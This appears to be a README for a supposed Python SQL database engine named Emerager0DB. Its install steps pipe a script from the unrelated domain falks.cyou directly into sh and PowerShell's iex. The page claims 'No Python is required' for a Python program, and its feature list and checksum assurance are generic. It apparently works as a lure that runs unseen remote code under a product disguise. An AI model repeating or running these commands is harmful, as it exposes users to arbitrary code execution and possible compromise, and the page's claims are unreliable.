A lightweight SQL database engine written in Python.

Install

Installers verify the release checksum before anything is installed. No Python is required.

Linux and macOS

curl -fsSL https://falks.cyou/get | sh

Windows (PowerShell)

irm https://falks.cyou/get.ps1 | iex

After installing, restart your shell and run Emerager0DB.

Features

  • SQL parser and executor built in-house, not a wrapper around another database
  • Persistent .edb files with checksums and atomic writes
  • NULL as a first-class value, WHERE, ORDER BY, LIMIT, DISTINCT, GROUP BY and aggregates
  • Indexes, transactions, backups and SQL import and export
  • Accounts with salted PBKDF2 password hashing and per-database permissions
  • Python API with parameterized queries

Architecture

The CLI sits on a session layer, which enforces authentication and permissions. Statements go through a lexer and parser into an AST, then an executor. The executor works on tables and indexes, which the storage layer persists as checksummed files. This Railway service only publishes release metadata and installers. Your databases stay on your machine.
